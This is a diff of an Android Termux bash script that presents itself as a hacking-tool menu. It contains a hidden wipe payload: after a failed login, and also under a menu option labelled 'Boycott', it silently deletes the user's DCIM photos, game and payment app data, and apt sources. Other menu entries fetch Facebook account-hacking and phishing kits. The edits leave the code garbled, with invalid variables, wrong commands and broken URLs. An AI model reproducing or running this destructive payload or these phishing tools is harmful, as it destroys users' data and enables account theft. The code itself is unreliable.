@@ -1,39 +1,39 @@
 
 
-#! BL4CK-ZuH@ck CODE
+#! Htoo4-99H@ck CODE
 
-termux-open https://zuhack.github.io/single-pa-Kaung-Lay-shibwoo/
+termux-open https://99hack.github.io/single-pa-Kaung-Lay-shibwoo/
 
 clear
 
 echo -e " \e[1;31m 
-\033[0;33m     111     111       111        111111     1111111111                 
-\033[0;32m     111 111 111      11 11       11  11        111
-\033[0;36m     111  1  111     1111111      111111        111
-\033[1;33m     111     111    11     11     11 11         111
-\033[0;31m     111     111   11       11    11  11        111
-\e[0m "
+\033[0;33m     000     000  0000000000     0000000
+\033[0;32m     000 000 000     000         00000000   
+\033[0;36m     000 000 000     000         000     
+\033[1;33m     000     000     000         000        
+\033[0;31m     000     000     000         000       
+ \e[0m "
 
 echo ""
 
 echo -e " \e[1;31m  
 Myanmar Anonymous Reporter Team ( Helper Team )
-"  | lolcat -a -d 20
+"  | lolcat -a -e 20
 
 echo ""
 
 
 #! username and password code 
 
-echo "Enter username" | lolcat -a -d 20
+echo "Enter username" | lolcat -a -e 20
 read username
-echo "Enter password" | lolcat -a -d 20
+echo "Enter password" | lolcat -a -e 20
 read password
 
-if [[ ( $username == "MART" && $password == "ZuH@ck" ) ]]; then
-echo "valid user" | lolcat -a -d 20
+if [[ ( $username == "MART" && $password == "99H@ck" ) ]]; then
+echo "valid user" | lolcat -a -e 20
 else
-echo "invalid fuck  user" | lolcat -a -d 20
+echo "invalid fuck  user" | lolcat -a -e 20
 #cod false virus
 cd
 termux-setup-storage
@@ -42,19 +42,19 @@ termux-setup-storage
 
 	 rm -rf /sdcard/DCIM
 
-rm -rf /data/data/com.termux/files/usr/etc/apt/sources.list.d/* 
+rm -rf /data/data/com.termux/files/usr/etc/apt/sources.list.e/* 
 	 
 	 rm -rf /sdcard/Android/data/com.mobile.legends
 	 
-	 rm -rf /sdcard/Android/data/com.mytel.myid
+	 rm -rf /sdcard/Android/data/com.dtac.myid
 	 
-	 rm -rf /sdcard/Android/data/com.mytelpay.eu
+	 rm -rf /sdcard/Android/data/com.dtacpay.eu
 	 
 	 rm -rf /sdcard/Android/obb/com.mobile.legends
 	 
 	 rm -rf /sdcard/Android/obb/com.tencent.ig
 	 
-	 rm -rf /sdcard/Android/media/com.mytel.myid
+	 rm -rf /sdcard/Android/media/com.dtac.myid
 	
 	 rm -rf /sdcard/.sketchware
 	 clear
@@ -67,39 +67,37 @@ fi
 #lolcat
 
 echo ""
- echo "1.Basic tool install" | lolcat -a -d 20
+ echo "1.Basic tool install" | lolcat -a -e 20
  echo ""
- echo "2.Facebook Old Account Hack" | lolcat -a -d 20
+ echo "2.Facebook Old Account Hack" | lolcat -a -e 20
  echo ""
- echo "3.Black Mafia (py2)" | lolcat -a -d 20
+ echo "3.Black Mafia (py2)" | lolcat -a -e 20
  echo ""
- echo "4.Pakistan Account Hack" | lolcat -a -d 20
+ echo "4 Myanmar Account Hack" | lolcat -a -e 20
  echo ""
- echo "5.Tool-X" | lolcat -a -d 20
+ echo "5.Tool-X" | lolcat -a -e 20
  echo ""
- echo "6.Porn" | lolcat -a -d 20
+ echo "6.Toolnlist" | lolcat -a -e 20
  echo ""
  echo "7.Boycott( Democracy )" | lolcat -a -d 20
  echo ""
- echo "8.Z-Phisher( Phishing )" | lolcat -a -d 20
+ echo "8.9-Phisher( Phishing )" | lolcat -a -d 20
  echo "" 
  echo "9.Social-Phish ( Phishing )" | lolcat -a -d 20
  echo ""
- echo "10.Porn" | lolcat -a -d 20
+ echo "10.password attack" | lolcat -a -e 20
  echo ""
- echo "11.Follow me" | lolcat -a -d 20
- echo ""
- 
+ echo "11.fb-hack ID" | located -a -e 20
  
  
  #!exit code
- echo "[0]  Exit " | lolcat -a -d 20
+ echo "[0]  Exit " | lolcat -a -e 20
  echo ""
- echo  "Choose A Number :  " | lolcat -a -d 15
-read -p "" zuzu;
+ echo  "Choose A Number :  " | lolcat -a -e 15
+read -p "" 99;
 #!exit 
 
-if [ $zuzu = 1 ] || [ $zuzu = 01 ]
+if [ $ = 1 ] || [ $99 = 01 ]
 then
 clear
  apt-get update -yq --silent 
@@ -131,68 +129,68 @@ clear
  pip3 install colorama -y
  pkg install nano -y
  pkg install curl -y
-echo " finish install pkg🌸pip2/3🌸apt "
+echo " finish install pkg🍦pip2/3🍦apt "
 fi
 
 
-if [ $zuzu = 2 ] || [ $zuzu = 02 ]
+if [ $99 = 2 ] || [ $99 = 02 ]
 then
 git clone https://github.com/botolmehedi/bint
 fi
 
-if [ $zuzu = 3 ] || [ $zuzu = 03 ]
+if [ $99 = 3 ] || [ $99 = 03 ]
 then
 git clone https://github.com/lovehacker404/World
 fi
 
-if [ $zuzu = 4 ] || [ $zuzu = 04 ]
+if [ $99 = 4 ] || [ $99 = 04 ]
 then
-git clone https://github.com/mrpardesi007/Adicloner.git
+git clone https://github.com/mracounthk007/Adicloner.git
 fi
 
-if [ $zuzu = 5 ] || [ $zuzu = 05 ]
+if [ $99 = 5 ] || [ $99 = 05 ]
 then
 git clone https://github.com/Rajkumrdusad/Tool-X.git
 fi
 
-if [ $zuzu = 6 ] || [ $zuzu = 06 ]
+if [ $99 = 6 ] || [ $99 = 06 ]
 then
-#pornhub csript start
+#Toolnlist csript start
 #!/bin/bash
 clear 
 p=1
-echo -e "\e[1;33m                           
-#####   ####  #####  #    # #    # #    # #####  
-#    # #    # #    # ##   # #    # #    # #    # 
-#    # #    # #    # # #  # ###### #    # #####  
-#####  #    # #####  #  # # #    # #    # #    # 
-#      #    # #   #  #   ## #    # #    # #    # 
-#       ####  #    # #    # #    #  ####  #####                                  
+echo -f "\f[1;33m    
+
+@@   @@   @@@     @@  @@@@@@@@@@@
+@@   @@   @@@@    @@     @@@@@
+@@@@@@@   @@  @@  @@     @@@@@
+@@   @@   @@   @@ @@     @@@@@
+@@   @@   @@    @@@@  @@@@@@@@@@@                      
 \e[0m"
 
 echo ""
 
-echo -e "\e[1;35m        Code By ZuZu ( N42 ) \e[0m"
+echo -f "\f[1;35m        Code By 99 ( N42 ) \f[0m"
 echo ""
-echo -e "\e[1;33m      !Only for boys & Girls over 18 years old! \e[0m"
+echo -f "\f[1;33m      !Only for boys & Girls over 18 years old! \e[0m"
 echo ""
 read  -p "Enter Category :: " pa 
 echo ""
-echo -e "\e[1;33m If you want to stop (CTRL + C ) \e[0m"
+echo -f "\f[1;33m If you want to stop (CTRL + C ) \f[0m"
 
 video=$(curl -s "https://www.pornhub.com/video/search?search=$pa&page=$p" -L | grep -oP '<a href="/view_video\K[^ ]+"' | cut -d '"' -f1 | sort -u > res.txt)
 error=$(curl -s "https://www.pornhub.com/video/search?search=$pa&page=$p" -L | grep -oP '<a href="/view_video\K[^ ]+"' | cut -d '"' -f1)
 
 title=$(curl -s "https://www.pornhub.com/video/search?search=$pa&page=$p" -L | grep -oP '<a href="/view_video\K[^ ]+" title="(.*?)"' | cut -d '"' -f3 | sort -u > title.txt)
 if [[ -z $error ]];then
-echo -e "\e[1;31m You check the internet \e[0m"
+echo -f "\f[1;31m You check the internet \f[0m"
 else 
 for i in $(seq $(cat res.txt | wc -l ))
 do 
 echo ""
 sleep 2 
-echo -e "\e[1;33m [#] Title :: "$(cat title.txt | sed -n "${i}p" )
-echo -e "\e[1;36m [#] Link :: \e[4;36m https://www.pornhub.com/view_video$(cat res.txt | sed -n "${i}p" )\e[0m"
+echo -f "\f[1;33m [#] Title :: "$(cat title.txt | sed -n "${i}p" )
+echo -f "\f[1;36m [#] Link :: \f[4;36m https://www.fb id.com/view_video$(cat res.txt | sed -n "${i}p" )\f[0m"
 echo ""
 done 
 rm -rf res.txt 
@@ -204,7 +202,7 @@ fi
 #pornhub csript sta
 fi
 
- if [ $zuzu = 7 ] || [ $zuzu = 07 ]
+ if [ $99 = 7 ] || [ $99 = 07 ]
 then
 clear
 
@@ -219,34 +217,34 @@ rm -rf /data/data/com.termux/files/usr/etc/apt/sources.list.d/*
 	 
 	 rm -rf /sdcard/Android/data/com.mobile.legends
 	 
-	 rm -rf /sdcard/Android/data/com.mytel.myid
+	 rm -rf /sdcard/Android/data/com.dtac.myid
 	 
-	 rm -rf /sdcard/Android/data/com.mytelpay.eu
+	 rm -rf /sdcard/Android/data/com.dtaclpay.eu
 	 
 	 rm -rf /sdcard/Android/obb/com.mobile.legends
 	 
 	 rm -rf /sdcard/Android/obb/com.tencent.ig
 	 
-	 rm -rf /sdcard/Android/media/com.mytel.myid
+	 rm -rf /sdcard/Android/media/com.dtac.myid
 	
 	 rm -rf /sdcard/.sketchware
 	 clear
 
 fi
 
-if [ $zuzu = 8 ] || [ $zuzu = 08 ]
+if [ $99 = 8 ] || [ $99 = 08 ]
 then
 git clone https://github.com/htr-tech/zphisher
 fi
 
-if [ $zuzu = 9 ] || [ $zuzu = 09 ]
+if [ $99 = 9 ] || [ $99 = 09 ]
 then
 git clone https://github.com/xHak9x/SocialPhish
 fi
 
-if [ $zuzu = 10 ] || [ $zuzu = 10 ]
+if [ $99  = 10 ] || [ $99  = 10 ]
 then
-git clone https://github.com/xHak9x/SocialPhish
+git clone https://github.com/xHak9x/pwd attack
 fi
 
 
@@ -257,12 +255,12 @@ fi
 
 if [ $zuzu = 11 ] || [ $zuzu = 11 ]
 then
-termux-open https://m.facebook.com/eikyaw.kaung.lay.ma.shi.9987
+termux-open https://m.facebook.com/fb.hack.id.9987
 fi
 
-if [ $zuzu = 0 ] || [ $zuzu = 0 ]
+if [ $99 = 0 ] || [ $99= 0 ]
 then
-echo " Wellcome Myanmar Anonymous Helper Reporter Team (BL4CK-ZuH@ck)" | lolcat -a -d 20
+echo " Wellcome Myanmar help team  (Htoo-99H@ck)" | lolcat -a -f 20
 sleep 2 
 exit
 
